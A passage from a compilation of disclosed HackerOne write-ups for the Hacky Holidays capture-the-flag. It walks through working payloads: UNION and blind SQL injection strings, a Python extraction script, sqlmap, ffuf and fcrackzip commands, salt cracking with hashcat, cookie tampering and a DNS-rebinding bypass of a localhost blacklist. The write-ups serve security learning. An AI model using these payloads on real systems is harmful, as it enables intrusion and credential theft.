('password', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/cGFzc3dvcmQiLCJhdXRoIjoiZWIxMzUyMDExN2ZmMjVmNjk1ZDk5NWFmMjAxMmNmYTMifQ==')
('username', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWUiLCJhdXRoIjoiODE5NmRkMzE3NWRiODMxOWYzODgwOTUyNmMyMjgyMTgifQ==')
('', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/IiwiYXV0aCI6ImMwMmI3Y2MwN2QwYTg4ZjE4NWVhNDU4N2JjMjFkM2I5In0=')
```

If we visit the URL we'll see 

{F1129470}

Now this could mean that I found the endpoint but as we know API's need parameters on the endpoints to be able to return some kind of data. So I edited the script a bit, because this time I wasn't getting `404` but `400`

so I changed the last if condition to:

```python
        if nr.content != "Expected HTTP status 200, Received: 400":
            print(endpoint, "--", new_url)
```

This gave me:

{F1129469}

```
('user\n', '--', u'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==')
```

The `password` and `username` gave me status code `204` not on the request but as the content. And if we checkout the `/api` table it says that `204` means `Successful request but with no data found` that means we just need to find the valid `username` and `password` to get the information/data.

For this I downloaded users.txt and rockyou.txt from SecList and tried to find the valid values one at a time. After hours of long run when I didn't find anything `@xEHLE` told me that I will never find those credential in any list and I need to find some other way. They also said `also think about how a lot of username lookups work`.

Now the way most looks usually works in DB are something like:

```sql
SELECT user FROM TABLE_NAME WHERE user="THE INPUT WE GIVE"
```

something like that but the problem is if that was the case then I think using wordlist would have worked. That is why the best way lookups would work in this case is if someone internally is using something like:

```sql
SELECT user FROM table_name WHERE user LIKE '<user_input>'
```

And I can see the issue with this, the problem is that now if user input is `a%` it might just return `TRUE`. To try this I modified my query in my script.

```python
import requests
from bs4 import BeautifulSoup

HOST = "https://hackyholidays.h1ctf.com"
hash_URL = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-8436%27%20UNION%20SELECT%20"1%27%20UNION%20SELECT%20%27rad.jpg%27,1,%27../api/user?username={}%%27%20--%20-",%2712%27,1--%20-"

strings = "0123456789abcdefghijklmnopqrstuvwxyz_"

for endpoint in strings:
    r = requests.get(hash_URL.format(endpoint.strip()))
    soup = BeautifulSoup(r.content, "html.parser")
    next_url = soup.findAll("img", {"class": "img-responsive"})
    if next_url:
        new_url = HOST + next_url[-1]["src"]
        nr = requests.get(new_url)
        if nr.content != "Expected HTTP status 200, Received: 204":
            print(endpoint, "--", new_url)
```

P.S - This script doesn't work recursively so it finds one character and then I would add that character and rerun the script. At this point I was loosing my mind and didn't wanted to miss anything so I decided to go slow :)

Major change to notice in this is the query:

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username={}%' -- -",'12',1-- -
```

With the help of this script I found one character at a time, the username was `grinchadmin` and in the similar way I found the password. The change in the query was just a bit:

```
-8436' UNION SELECT "1' UNION SELECT 'rad.jpg',1,'../api/user?username=grinchadmin%26password={}%' -- -",'12',1-- -
```

one character at a time I found the password i.e `s4nt4sucks`

Using these credentials I logged in to the attack box(https://hackyholidays.h1ctf.com/attack-box/login)

{F1129473}

Thanks to @neolex @mcipekci @xEHLE and every one who gave hint for this challenge I don't think I could have done this alone.

# Flag 12

For this we start from the very same page on which we found the flag for 11th challenge. We can see that there are three IP and red buttons to attack those.

If we click on any of those buttons then a new tab opens up which shows that some ping requests were sent

{F1129482}

Now if we look at href in those `ATTACK` buttons they looks like:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

Decoded base64 looks like:

```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}                                                                                                     
```

Now as we can see there is a target and a hash, so I checked if the hash is the `md5` of the `target` value but it wasn't. I tried replacing the hash but got nothing but errors. If the hash is of the target then there is a possibility that it was salted meaning if we calculate the md5 without hash it will be different.

To test this I decided to use hashcat and see if I can recover any `salt`

```bash
hashcat -m 10 -O hash.txt rockyou.txt -o hash.out
```

{F1129483}

we can see that we found the salt to be `mrgrinch463` this means that now we can generate our own target. So the very first one that I tried was `hackyholidays.h1ctf.com`

I used [this](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) to generate the hash and then base64 encoded it to send it to the URL.

```json
{"target":"hackyholidays.h1ctf.com","hash":"59bcc3074be23595ebb5e4259abc0de6"}
```

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJoYWNreWhvbGlkYXlzLmgxY3RmLmNvbSIsImhhc2giOiI1OWJjYzMwNzRiZTIzNTk1ZWJiNWU0MjU5YWJjMGRlNiJ9
```

But the attack was aborted because it detected that `Local target` was being attacked. So the next step is clear we need to bypass this so we can attack the `localhost` cause that is the house of `grinch` and we need to destroys grinch network.

{F1129484}

In the above image we see an attack happening on `192.168.1.1.xip.io` what we can understand from this is:
1) The input target is first resolved.
2) `Spinning up botnet` is when the system checks wether the `target` is localhost or not.
3) Then we see it says: `Launching attack against: 192.168.1.1.xip.io / 192.168.1.1` that means it launched the attack on the `target` that was provided by the user as an input instead of using the host which is receives in STEP-1 after resolving.

If we have to write a pseudo code for this kind of functionality it would look like:

```
BLACKLIST = ["127.0.0.1", "OR WHATEVER YOU WANT"]
if RESOLVE($user_input) != BLACKLIST:
	Launch_attack_on($user_input)
```

***

This is like first we sanitize something and then we use the unsanitized input. Now we know what the problem is we just need to find a way to exploit it. This kind of vulnerabilities are known as[ `TOCTOU`(Time of check, Time of use)](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). 

The specific way to exploit the vulnerability we need to use [`DNS rebinding`](https://en.wikipedia.org/wiki/DNS_rebinding). In simple way `DNS rebinding` is type of TOCTOU in which a certain `domain` resolves to something and when the same domain is resolved again it would resolve to something.

Ex: I found this service called [1u.ms](http://1u.ms/)

```
host -t A make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

{F1129485}

We can see how a single domain first resolves to `1.2.3.4` and then it resolves to `169.254.169.254`.

***

We have to do the same kind of attack so first our domain will resolve to any random IP which will pass the blacklist but later when the attack is lauched it will resolve to `127.0.0.1` putting down the grinch's network.

I tried to use something like `make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms` which will resolve to `1.2.3.4` first and then `localhost` later. I generated the hash for this and base64 encoded it and then passed it in the `payload` parameter but it didn't work. It wouldn't resolve to `127.0.0.1`. I tried the same process various time but nothing. So I felt that this(`1u.ms`) must be the problem and then I googled `dns rebinding service`.  The first URL that we get is https://lock.cmpxchg8b.com/rebinder.html, this service says that it will take two IP and will then resolve randomly to any of these IP's

I used `1.2.3.4` in the `A` and `127.0.0.1` to B

{F1129486}

and then got `01020304.7f000001.rbndr.us`. So I used this as the target and generated the hash for this target using `mrgrinch463` salt using [this](http://md5.my-addr.com/md5_salted_hash-md5_salt_hash_generator_tool.php) website.

```json
{"target":"01020304.7f000001.rbndr.us","hash":"69c31cdcfad3ef1deb652f4aca52d2cc"}
```

Then I used [cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')&input=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9) to base64 encode this.

The final URL looked like:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9
```

I had to paste this URL various time since it would randomly resolve to `127.0.0.1` sometime and check would fail but in the end I got it.

{F1129490}

{F1129487}

🎉🎉🎉🎉

## Impact

This CTF was amazing. I really enjoyed it, learned loads of stuff and would really like to thank @adam for making this awesome CTF. Thanks to @neolex @0xatul @shamollash @xEHLE and everyone who gave any kind of hint or helped me in any way. I xouldn't have solve this all by my self.

---

### [[hackyholidays] CTF write-up](https://hackerone.com/reports/1069376)

- **Report ID:** `1069376`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @rend
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:59:55.169Z
- **CVE(s):** -

**Vulnerability Information:**

hi, this is my write-up for hackyholidays CTF.
I attached the write-up in PDF format.
thanks, REND

## Impact

saving the Christmas...
fix this otherwise people would be happy.

---

### [Hacky Holidays Writeup](https://hackerone.com/reports/1067835)

- **Report ID:** `1067835`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @cardinal
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T17:59:25.974Z
- **CVE(s):** -

**Vulnerability Information:**

On December 12th, 2020, the CTF became live and the scope that we are allowed to attack was

```
In Scope Domain - **hackyholidays.h1ctf.com**
```

Our main motive was to infiltrate his network and take him down. The challenges appeared one by one till 24th of December. Here we will be going through all the steps taken to obtain all the flags.

# TL;DR
{F1133152}

# Detailed

## Flag 1 - KEEP OUT

It all started with hitting `hackyholidays.h1ctf.com`, we are greeted with a KEEP OUT sign. And we are not going to listen to the Grinch. So, on a little bit of enumeration found  `robots.txt`, which often contains some endpoints that can be utilize for further reconnaissance. 

In the `robots.txt`, the first flag was found with a `Disallow` entry of `/s3cr3t-ar3a`, which will be available for next day.

```
hackyholidays.h1ctf.com/s3cr3t-ar3a
```


## Flag 2 - Page Moved

On the second day, when we hit the `/s3cr3t-ar3a` endpoint, it shows that the page is moved with a message left behind that "If you're allowed access you'll know where to look for the proper page!" It means that we have to find the new endpoint for where this page has moved to.

This flag was bit tricky(at least for me). Upon checking the source code from `View Page Source` options and did other directory brute forcing, etc. but there was no where to go. 

Tinkering around the application bit more, when `inspected the web page using DOM`, it revealed some interesting information (flag and endpoint) that was not available in the source code.

{F1133157}
{F1133156}

But it was unsure to me, how it happened, so upon doing a bit research, came to know that the "View Source" simply **shows the HTML as it was delivered from the web server to our browser, where as, "Inspect Element" shows the current state of the DOM tree, after HTML error correction, HTML normalization and DOM manipulation by JS.** 

And it all made sense about this flag. I really loved this one. Now we have `/apps` endpoint, where [Grinch](https://twitter.com/adamtlangley) is going to post all other challenges for us to solve.


## Flag 3 - People Rater

Objective - **Find record that does not belong there.**

In `/apps` directory, on the third day, a new challenge appeared - **People Rater**, which contains a list of people which when clicked, gives rating(mostly bad).
{F1133158}

When each button is clicked, an ID is being passed in GET request, as following

```
GET /people-rater/entry?id=eyJpZCI6Mn0=
```

The ID is in base64 encoded form of `{"id":<number>}`. For example, in the above request the value for `?id=` results in `{"id":2}`.  The fun part is the list starts with id = 2. Passing the base64 encoded string of value `{"id":1}` it returns a different rating(which was good) and a flag.

```shell
$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0= 
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

This vulnerability is an example of **IDOR - Insecure Direct Object Reference**, the get parameter passes a value that can be altered and can access other details, which was supposed to be hidden in this case.


## Flag 4 - Swag Shop

Objective - **Find Grinch's Personal Details from the online shop for Grinch Merch.**

Upon inspecting the source code, a JS code snippet was found, which revealed another endpoint, called `/api` and upon fuzzing that endpoint, we found

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w common.txt -mc all -fc 404
...
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
...
```

In the `/api/sessions` we found 8 base64 encoded session and Grinch has messed up with all of it but one, which when decoded yield

```json
eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```

Now, we have value for `user` which looks like a `uuid` and a cookie. At the first sight, the cookie looked interesting, so after playing with it for some time and reaching no where. It was better to take another approach.

Another interesting endpoint was `/user` which receives GET request and after some guessing, when passed the value for `uuid` parameter with the `/api/user` endpoint it give the information of Grinch's account and the flag. 

{F1133159}

Another IDOR vulnerability, exploiting which, the attacker was able to access the details directly with the UUID.


## Flag 5 - Secure Login

Objective: **Try and find a way past the login page to get to the secret area.**

We were presented with a login form, which in it's error response says if the username/password is incorrect. So we can use it to filter the response and fuzz for username and password one at a time.

**Fuzzing for username:**
```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  names.txt -d "username=FUZZ&password=something" -fr "Invalid Username" -H "Content-Type: application/x-www-form-urlencoded"
...
access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
...
```

**Fuzzing for password:**
```shell
$ ffuf -u https://hackyholidays.h1ctf.com/secure-login -w  10-million-password-list-top-10000.txt -d "username=access&password=FUZZ" -fr "Invalid Password" -H "Content-Type: application/x-www-form-urlencoded"
...
computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

Now, we have the credentials (`access:computer`) using which we can login, and upon login we get a page that shows
{F1133163}

Inspecting at the cookie (`securelogin`), we find it's base64 encoded and upon decoding it, we find it contains an attribute called `admin` and it was set as `false`.  So, tried to craft the `securelogin` cookie in such a way that it contains the user's cookie attribute untouched and change the `admin` attribute is set to `true`. 

Using [CyberChef](https://gchq.github.io/CyberChef) for the encoding and decoding,
{F1133164}

Then used the Dev Tools' Storage section to modify the cookie and reload the page to get a zip file,
{F1133165}

We now have a zip to work on and it's password protected, we can use `fcrackzip` to bruteforce the password, and on doing that we found the password and retrieved the flag.

```shell
$ fcrackzip -u my_secure_files_not_for_you.zip -D -p 10-million-password-list-top-10000.txt

PASSWORD FOUND!!!!: pw == hahahaha
```

`fcrackzip` here is being used with flags, 

- -u  →  use unzip to remove wrong password
- -D  →  use a dictionary for bruteforcing
- -p  →  to use string as initial password/file

and upon unzipping, it yield two files - flag.txt and xxx.png. 
{F1133166}

And it's day 5 and Grinch is still trying it's best to ruin the Christmas.


## Flag 6 - My Diary

Objective -  **Find out Grinch's upcoming event.**

The application seem to load and render files from the GET parameter. So, tried fuzzing the GET parameter, 

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ -w common.txt -mc 200
...
index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
...
```

When trying to render the `index.php` it gives blank page but the `Words: 126, Lines: 22` that `ffuf` gave us was contradicting the fact that the page was blank so upon inspecting the source of the page, it gives out `PHP` code.

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Code Snippet demonstrated how templates are being rendered, and how to access the admin panel.

There is some validation on the value received from the template parameter. So, let's break it down-

- It only accepts characters - UPPER CASE and lower case alphabets, number from 0 to 9, and a dot(.)
- It nulls out the value, if the value entered is - `admin.php` or `secretadmin.php`

We have to get access to the `secretadmin.php` and if we try to directly access it, it gives a message

```
You cannot view this page from your IP Address
```

So we have to pass it through the template parameter, and in order to bypass the validation we have to craft a payload that can help us by pass all the checks.

Let's try crafting one,
{F1133167}

And passing this in the template, gives access to the secret admin panel.

```
https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretadadmin.phpmin.phpdmin.php
```

{F1133168}

This was a case of weak input validation. And we can see Grinch's unlisted upcoming event and it seems real bad!!


## Flag 7 - Hate Mail Generator

Objective - **Find the hidden flag, as Grinch sends his mail by email campaigns.**

We have been given a campaign manager, where previous campaigns are listed and option to create a new one is also available. 

We have a listed campaign, which contains some data and we cannot create one because "you've run out of credits". But from this listed campaign we get to know how to include pre-made templates and other html tags are also allowed.

{F1133169}

So, there must be other templates that can be incorporated, and on performing directory bruteforcing, it yields a directory that lists different templates.

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -w  common.txt
...
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
...
```

{F1133172}

We found that there is this admin header, which cannot be accessed directly but maybe we can use it to incorporate as a template. 

Upon trying to create a new campaign, we are not allowed to create it but are allowed to preview it...and upon previewing we get a name, that we have not input.

{F1133171}

And it outputs the following result,

```
Hello Alice ....
```

Upon inspecting the source code, it was evident that "Alice" is coming from a hidden input field. So, we have a bunch of input field and injecting templates in the Name, Subject and Markup Fields does not result in success.

We can try to inject `38dhs_admins_only_header.html` in other field that are being rendered on the page, and in this case, the value from the hidden field is. 

Upon trying to inject the template in the `name` attribute - `{{template: 38dhs_admins_only_header.html}}` and submitting the form, gives us the flag!!

{F1133175}
{F1133174}


## Flag 8 - Forum

Objective - **Get access to admin section of the forum.**

Started off with directory bruteforcing gave some things to play with,

```shell
$ ffuf -u https://hackyholidays.h1ctf.com/forum/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404
...
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
...
```

After trying out different things on the application (that too of no use), went down the recon path. Searching for a bit, came across a commit that looked interesting, on [Adam Langley's GitHub](https://github.com/adamtlangley).

{F1133177}

And we have a code base, to look into. Enumerating the GitHub repository, we come across a commit that was for a `small fix` and that was to remove the hardcoded credentials, that was committed earlier.

{F1133179}

It's the leaked credentials for database, using which we can log in to `phpmyadmin` to get access to the database, where the the credentials were stored.

{F1133178}

And trying to crack the password hash using [CrackStation](https://crackstation.net/) gave us the Password for grinch (Admin).
{F1133180}

And using the credentials `(grinch:BahHumbug)`, we were able to login and check out the "Secret Plans" which gave us the flag and information about Grinch having Santa's Location!!

{F1133181}


## Flag 9 - Evil Quiz

Objective - **Find Flag and Have access to the admin area! ;)**

This was a quiz application to "Check how evil are you?" In the first page, it takes name as input then asks a few questions and gives rating (Out of 3) and number of people having the same name. 

{F1133183}

Now, this looks fishy. If I had to guess, the logic behind showing the "people with same name" can be,

```sql
select count(*) from table where name like "whatever";
```

And, yes after tinkering with it for a few moments, confirmed my doubt about SQL**i - Boolean based SQLi.**

**Identification-**  For a particular name, suppose there are 30 members and when I do something to break the syntax the number of members drops to zero (shows error).

```
name=admin'  # breaks the syntax
```

Upon doing some manual SQLi and guess work, got hold of a few things like

- `admin' AND (length(database())) = 4--`  - Gives the length of database name - 4 characters
- `admin' AND (ascii(substr((select database()),1,1))) = 113 --`  - Gives that the first character is `'q' (113)`

**Guess Work -** 4 characters and starts with 'q' - seems like `quiz` and we have our database name. And now using this we can try to figure out name of the table that is inside the database.

- `admin' AND (length((select table_name from information_schema.tables where table_schema='quiz' limit 0,1))) = 5 --`  - Gives the length of the table name - 5 characters
- `admin' AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="quiz" LIMIT 0,1),1,1))) = 97--` - Gives that the first character is 'a'

**Guess Work -** 5 characters and starts with 'a' - seems like `admin` and we have out table name.

Similarly, we can do to find the column names and stuff but we can't keep on going this forever, there are two ways to approach this,

- We can use automated tool like `sqlmap` and
- We can script it (if anyone is interested, didn't use this method)

 ```python
 import requests
 import string

# All the printable characters
chars = string.printable
# Maintaining Session State
session = requests.Session()
final = ""
ct = 0
print("[*] Finding Password ... ")
password = 1
 while ct < 100 :
    ct = 1
    for char in chars:
        sqli="1' or (ascii(substr((select password from admin ) ,{},1))) ={} -- -".format(str(password),ord(char))
        post_parameters = {"name":str(sqli)}
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/84.0.522.63","Content-Type":"application/x-www-form-urlencoded"}
        cookies = {"session":"206979a74800a0190f1f04c10db5ca8c"}
        post_response = session.post("https://hackyholidays.h1ctf.com/evil-quiz", data=post_parameters, headers=headers, cookies=cookies)
        get_response = session.get("https://hackyholidays.h1ctf.com/evil-quiz/score", headers=headers, cookies=cookies)
        # print(char)
        if  'There is 0 other player(s)' not in get_response.text:
            final += str(char)
            print(final)
            break
        ct += 1
    password += 1
print('[+]Found: '.format(str(final))) 
```

I took taking the lazy way - `SQLMap`. Setting up `SQLMap` to use post data and redirection URL as well, with other headers and fact checking `--not-string` flag, along with the database and table specified, that we found earlier.

Without following redirects and merging the cookie, here we successfully ran the `sqlmap` that yield us the credentials.

```shell
$ sqlmap -u 'https://hackyholidays.h1ctf.com/evil-quiz' --data 'name=cardinal' --second-url 'https://hackyholidays.h1ctf.com/evil-quiz/score' --random-agent --not-string 'There is 0 other player' --technique=B --level=3 --risk=3 --cookie 'session=206979a74800a0190f1f04c10db5ca8c'  -D quiz -T admin --dump
...
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
...
```

Using which we can log into the admin zone to obtain the flag. 


## Flag 10 - Signup Manager

Objective - **Try to get into the Grinch's army (as an insider maybe xD)**

We have two forms - signup and login. And we have to leverage them to become the admin. Checking out the "View Source", it has a comment at the very beginning,

```html
<!-- See README.md for assistance -->
...
```

So, upon visiting [`https://hackyholidays.h1ctf.com/signup-manager/README.md`](https://hackyholidays.h1ctf.com/signup-manager/README.md), gave us the README.md file, which had other instructions mentioned to install `SignUp Manager`

```markdown
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

It mentioned one more file - `signupmanager.zip` which can be downloaded the same way as README.md by visiting - [`https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip`](https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip) 

```shell
SignUpManager
├── admin.php
├── index.php
├── README.md
├── signup.php
├── user.php
└── users.txt
```

`index.php` contained all the code for user creation and validation.

This was fun and easy. We have to perform source code review to find out the vulnerability that can help us become admin user.

All the components are properly validated and sanitized, except one - `age`. It was accepting any input from the browser.

There is only one condition check that is being performed is  that the length of the value of `age` cannot be more than three characters.

**Relevant Code Snippets [index.php]**

```php
...
'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
...
$line .= str_pad( $age,3,"#");
...
$age = intval($_POST["age"]);
...
```

What we can notice is that the code is trusting whatever is coming from the browser. In the case of `age` it accepts on 3 characters and then passes it to `intval()` that allows the input to be converted to a integer and get stored in the database (users.txt).

**Format of users.txt**

```php
$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
$line = '';
$line .= str_pad( $username,15,"#");
$line .= $password;
$line .= $random_hash;
$line .= str_pad( $age,3,"#");
$line .= str_pad( $firstname,15,"#");
$line .= str_pad( $lastname,15,"#");
$line .= 'N';
$line = substr($line,0,113);
file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
```

It stores data in users.txt as

- It stores `username`, `firstname`, and `lastname` with 15 characters padding, that means cannot allow more than 15 characters.
- 2 md5 hash → `password` and `random_hash` = 64 characters
- `age` - 3 characters padding, cannot allow more than 3 characters
- and at the last it appends one character `N`.

Total character count = 113 and at last it `substr()` it to extract characters from 0 to 113.

According to the README.md, if a record in users.txt has `Y` at it's end, it becomes an `admin user`. There is not much we can tinker with, we can just use age to our advantage.

**Methodology**

To become `admin`, we need to omit out `N` in from the record, and put `Y` in place of that, we can use `age` and `lastname` to our advantage and get access.

Since we know, whatever value we pass in age get into `intval()` which makes the string as integer. So, what if we can pass 4 characters from `age` and put last character of `lastname` as `Y`. We are ADMIN!

To do that, we can intercept the request, change the age value to `1e3` which later passed in `intval()` outputs 1000 [4 characters] - it omits the `N` and pass the lastname's last character as `Y`. 

The desired request data will be,
{F1133184}

It creates an user successfully and we can login to get the flag.

{F1133185}


## Flag 11 - Grinch Recon

Objective - **Get Access to the Attack Box**

URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/`

Grinch is tracking Santa for last few years trying to locate his secret workshop and he had collected some photographs and stored them for us to analyze.
{F1133189}

Album URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`
{F1133190}

Image URL: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9`

Which consists of base64 `data`'s value, which when decoded, gives and `image path` and `auth` token.

```json
# Album Hash: jdh34k
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9 
=> {"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

With initial unsuccessful attempts for de-hashing the `auth` hash and trying to change the `image path`, moved ahead for further enumeration and struggling to find some vulnerability, a hint was dropped and I was like "NOT AGAIN!"

{F1133186}

It then hit me that it might be SQLi-inception similar to the previous challenge I solved in the last CTF. But this time it was frustrating as hell. Let's see how was it!

Possible SQLi endpoints were `album` parameter and `data` parameter, but the `data` parameter felt very unlikely. Therefore, trying to find an SQLi on `album` for some time yield 404 and I was supper happy and annoyed at the same time 😂 and the payload that worked for me was:

```
.../r3c0n_server_4fdk59/album?hash=-1' union select 1,2,3 -- -
```

And at this point '3' got output on the screen to I decided to further enumerate the database.

- database - `recon`
- tables
    - `album`
        - id
        - hash
        - name
    - `photo`
        - id
        - album_id
        - photo

And reading the data inside the tables, gave an idea of how things are stored in the database. While enumerating the `photo` table

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-1' UNION ALL SELECT 1, 2, group_concat(album_id,",",id,",",photo,";\n") from photo-- -
```

{F1133192}

The image names are stored in the database and as we have seen in the base64 decoded JSON, it's the path.

```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```

Basically what it does is, takes the name and adds the other part to it and then generate an `auth` token for it. Therefore, we have to make the application generate an auth token for the any path that we want to visit

Playing with other parameters, we came to know that the 1st parameter takes the `album_id` that takes the `photo` and appends it to the path (`r3c0n_server_4fdk59/uploads/{filename}`) and renders it on the website.

We don't have access to the `/api` endpoint directly, so we can pass the path in the SQL query that will provide us access to the `/api/` endpoint. Let's see how:

```json
.../r3c0n_server_4fdk59/album?hash="-1' UNION ALL SELECT "-1' union all select NULL,NULL,'../api/endpoint'-- -",2,3-- -
```

